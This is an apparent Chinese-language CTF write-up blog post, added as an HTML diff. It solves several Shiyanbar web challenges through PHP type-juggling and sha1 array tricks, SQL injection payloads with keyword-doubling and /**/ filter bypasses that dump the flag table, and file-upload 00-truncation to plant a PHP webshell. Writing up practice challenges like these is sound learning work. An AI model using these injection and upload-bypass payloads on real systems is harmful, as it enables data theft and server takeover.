@@ -1,0 +1,164 @@
+<!DOCTYPE HTML>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+<title>Hexo</title>
+<meta name="author" content="John Doe">
+<!--[if IE]>
+  <meta http-equiv=refresh content='0, http://browsehappy.com'>
+<![endif]-->
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css">
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css">
+<link rel="stylesheet" href="/css/style.css">
+
+
+<body oncontextmenu="return false">
+  <div class="aios_content">
+    <div class="bg-gradient"></div>
+    <div class="bg-pattern"></div>
+    <div class="menu-bg">
+  <div class="menu-container">
+    <ul>
+      
+        <li class="menu-item">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/archives">Docs</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+<nav>
+  <a></a>
+</nav>
+
+    <div class="container" style="padding-bottom:40px">
+      <div class="row">
+  <div class="col-sm-12">
+    <header>
+  <div class="logo">
+    <h1 id="main-title" class="title"><a href="/">Hexo</a></h1>
+  </div>
+</header>
+
+
+    <section class="main">
+      <div class="post">
+  <div class="post-header">
+    <h1 class="title"></h1>
+    <div class="post-info">
+      <span class="date">2019-02-18</span>
+
+      
+    </div>
+  </div>
+
+  <div class="content">
+    <!-- Gallery -->
+    
+
+    <p>做了几道实验吧的web题，在这里分享一下</p>
+<p>然后顺便复习一下，几道题有有很多sql注入的题，然后让我深知我水平完全不够，还有很多要学的。</p>
+<p><strong>0x01 你真的会php吗？</strong></p>
+<p>打开后，查看http报文头的信息，然后发现里面有txt文件，打开<br><img src="/2019/02/18/几道实验吧的web题/1.png" alt="1"><br>里面是一段源码。</p>
+<p> 审计原代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = &quot;&quot;; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=&quot;xxxxxxxxxx&quot;;</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_error&quot;, false); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&apos;number&apos;]))&#123; #提交的变量是否为number</span><br><span class="line">   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);</span><br><span class="line"></span><br><span class="line">   die(&quot;have a fun!!&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach([$_POST] as $global_var) &#123; </span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123; #遍历提交的数据 </span><br><span class="line">        $value = trim($value);#去除提交字符串两边的空格还有约定符号 </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; #判断提交数据是否为字符串，并且储存在req中。</span><br><span class="line"></span><br><span class="line">#判断是否为回文字符串</span><br><span class="line">function is_palindrome_number($number) &#123; </span><br><span class="line">    $number = strval($number); </span><br><span class="line">    $i = 0; </span><br><span class="line">    $j = strlen($number) - 1; </span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;]))&#123;</span><br><span class="line">    </span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;#输入的不能为纯数字</span><br><span class="line"></span><br><span class="line">&#125;else if($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123;#提交的数值和取整后的数值必须相同</span><br><span class="line">      </span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);#vaule1为取整后的数值</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));#value2为反转后的数值  </span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;#判断两个数值是否相同</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;#调用方法 is_palindrome_number() 来判断是否为回文数字，比如121就得不到回文数字</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $info;</span><br></pre></td></tr></table></figure></p>
+<p>然后就想到?number=0e0%00,联系之前bugku的矛盾一题。<br>然后就可以先试一试，发现不可以<br><img src="/2019/02/18/几道实验吧的web题/2.png" alt="2"><br>看了别人的writeup<br>改成了：0e-0%00，然后就能返回出flag,因为0e0%00是回文，那么问题来了，为什么0e-0%00或者0e+0%00就可以，这是因为xey：x倍的10的y次方。这下就好理解了。<br><img src="/2019/02/18/几道实验吧的web题/3.png" alt="3"></p>
+<p><strong>0x02 FALSE</strong><br><img src="/2019/02/18/几道实验吧的web题/4.png" alt="4"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">    if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])</span><br><span class="line">        echo &apos;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&apos;;</span><br><span class="line">    else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))</span><br><span class="line">      die(&apos;Flag: &apos;.$flag);</span><br><span class="line">    else</span><br><span class="line">        echo &apos;&lt;p&gt;Invalid password.&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	echo &apos;&lt;p&gt;Login first!&lt;/p&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后这道题，我觉得很有必要理解一下==和===的差别：</p>
+<p>这要说到php代码是弱类型的语言，如类型的语言可以把数字和字符串做比较，例 123==“123” ？</p>
+<p>在php中这一类的比较是属于弱类型的比较，使用2个等于号，仅仅比较两个的值，一看都是123 ，便返回相等</p>
+<p>而3个等于号是全方位的比较等号两边的‘东西’ 不仅仅比较值得大小，数据的类型也算入其内了，例123===“123” ，这就是错的，会返回false</p>
+<p>这里我觉得有两种解法，一个是sha1碰撞，一个是通过sha1()函数的漏洞<br>第一种解法我就直接挂上大佬的writeup:<a href="http://www.shiyanbar.com/ctf/writeup/4512" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/writeup/4512</a></p>
+<p>然后第二种解法是sha1()中存在着一种漏洞，无法对数组进行处理,那就直接构造URL<br>    <code>http://ctf5.shiyanbar.com/web/false.php?name=123&amp;password=456</code><br><img src="/2019/02/18/几道实验吧的web题/5.png" alt="5"><br>然后我们修改这段url<br>    <code>http://ctf5.shiyanbar.com/web/false.php?name[]=123&amp;password[]=456</code><br>得到flag<br><img src="/2019/02/18/几道实验吧的web题/6.png" alt="6"></p>
+<p><strong>0x03 简单的sql注入　１－３</strong></p>
+<p>简单的sql注入１：<br>先挂上万能注入的payload<br>    <code>1&#39; or &#39;1&#39;=&#39;1&#39;</code><br><img src="/2019/02/18/几道实验吧的web题/7.png" alt="7"><br>可以想到sql语句为单引号闭合形式<br>    <code>select * from * where post=&#39;###&#39;</code><br>然后再尝试<br>    <code>1&#39; or &#39;1&#39;=&#39;1</code></p>
+<p>发现or没有被过滤，那我们就再试试别的。在burp中可以模糊注入一下，看看其他的关键词是否被过滤<br>然后发现几乎都被过滤了</p>
+<p>然后尝试一下<br>    <code>1 union or</code><br>然后发现　union　不见了。<br>    <code>1 unionunion or</code><br>实际上发现空格也被吞掉了，现在知道了过滤机制是什么，构造payload,还要关注单引号闭合<br>    <code>1&#39; unionunion  selectselect  database() &#39;</code><br>发现是可以的，然后挂上我的payload,爆表名：<br>    <code>1&#39; unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  table_schtable_schemaema=database() andand  &#39;1&#39;=&#39;1</code></p>
+<p>爆字段名：<br>    <code>1&#39; unionunion  selectselect  column_namcolumn_namee  fromfrom  information_scheminformation_schema.columnsa.columns  wherewhere  table_name=&#39;flag</code><br><strong>这里，我觉得有一点值得关注，就是要巧用单引号闭合</strong></p>
+<p>爆出flag:<br>    <code>1&#39;unionunion  selectselect  flag  fromfrom  flag  wherewhere  &#39;1&#39;=&#39;1</code></p>
+<p>仔细想一下，发现好像过滤机制自己搞错了，好像过滤掉后面带空格的关键字，所以我们要想个办法绕过空格，+、%0a、%0b、/<strong>/……　这里使用/</strong>/<br>所以payload可以为下面这样：<br>   <code>1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code></p>
+<p>简单的sql注入２：<br>这道题，纯属运气，在第一题的基础上，我尝试了一下，发现空格会被过滤掉，然后有些字符也被过滤掉<br>我尝试了一下’union’,’select’,’union select’,’union/<strong>/‘,’union/</strong>/select’,’union/<strong>/select/</strong>/‘<br>然后得出了用/<strong>/绕过的法子，看了一下大佬的writeup，难得自己对了一次.<br>payload:<br>`1’/</strong>/union/<strong>/select/</strong>/flag/<strong>/from/</strong>/flag/<strong>/where/</strong>/‘1’=’1`</p>
+<p>简单的sql注入３：<br>这道题暂时先留着，因为不知道为什么sqlmap不会用，可把我气死了。<br>估计是什么东西没有安装好，等开学请教同学。</p>
+<p><strong>0x04 上传绕过</strong><br>这道题和南邮的一道CTF题简直一模一样，<br>这里放上一个博主的文章，关于00截断的一些见解，我觉得还蛮有用的<br><a href="https://blog.csdn.net/zpy1998zpy/article/details/80545408" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80545408</a></p>
+<p>考点：00截断<br>然后我们这题<br><img src="/2019/02/18/几道实验吧的web题/8.png" alt="几道实验吧的web题/7.png"><br>因为只允许上传jpg,png等图片格式文件，然后我用图片一句话木马，然后上传后抓包修改图片文件名，连上蚁剑，找flag,发现我错了，然后评论里说用00截断<br>上网找了00截断的资料。</p>
+<p>所以我想多了。</p>
+<p>首先上传一个jpg文件，抓包，放入repeater.<br><img src="/2019/02/18/几道实验吧的web题/9.png" alt="几道实验吧的web题/7.png"><br>提示：<br><img src="/2019/02/18/几道实验吧的web题/10.png" alt="几道实验吧的web题/7.png"><br>又要上传的是图片文件，又要有php做后缀。<br>所以这里有双重验证，客户端一次验证，服务器端一次验证。<br>文件基本要是 xx.phpxx.jpg</p>
+<p>所以有00截断的思路，一个图片文件在客户端验证的过程中为jpg文件，然后到服务器时又为php文件，我们使用00截断，在文件的路径上进行添加文件后缀名<br>获得flag<br><img src="/2019/02/18/几道实验吧的web题/11.png" alt="几道实验吧的web题/7.png"><br><img src="/2019/02/18/几道实验吧的web题/12.png" alt="几道实验吧的web题/7.png"></p>
+<p>上面文章中有一题00截断的php代码分析题，我觉得还不错<br><img src="/2019/02/18/几道实验吧的web题/13.png" alt="几道实验吧的web题/7.png"></p>
+<p>这道题正确的payload是:<br><code>?nctf=1%00%23biubiubiu</code><br>因为是url编码所以把 # 改成了 %23</p>
+
+    <span class="date end-date">2019-02-18</span>
+  </div>
+
+  
+
+  
+</div>
+
+    </section>
+  </div>
+</div>
+
+    </div>
+  </div>
+  <footer class="footer-content">
+  <div class="container">
+    <div class="row">
+      <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+        <h2>About</h2>
+        <section>
+          Theme developed by <a href="//github.com/klugjo" target="_blank">Jonathan Klughertz</a><br>Contents created by <a href="//github.com/xaios" target="_blank">AIOS</a>
+        </section>
+      </div>
+      
+  <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+    <h2>New Contents</h2>
+    <ul>
+      
+        <li>
+          <a class="footer-post" href="/2019/02/18/几道实验吧的web题/"></a>
+        </li>
+      
+        <li>
+          <a class="footer-post" href="/2019/02/12/PHPMywind储存XSS漏洞/">PHPMywind储存XSS漏洞</a>
+        </li>
+      
+        <li>
+          <a class="footer-post" href="/2019/02/12/文件判断函数的安全隐患/">文件判断函数的安全隐患</a>
+        </li>
+      
+        <li>
+          <a class="footer-post" href="/2019/02/08/BUGKU-WEB/">BUGKU-WEB</a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+      
+
+    </div>
+    <div class="row">
+      <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+        <ul class="list-inline footer-social-icons"></ul>
+      </div>
+    </div>
+    <div class="row">
+      <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+        <div class="footer-copyright">@Untitled. All right reserved | Design & Hexo <a href="//www.codeblocq.com" target="_blank">Jonathan Klughertz</a></div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+</body>
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js"></script>
+<script src="/js/main.js"></script>
+
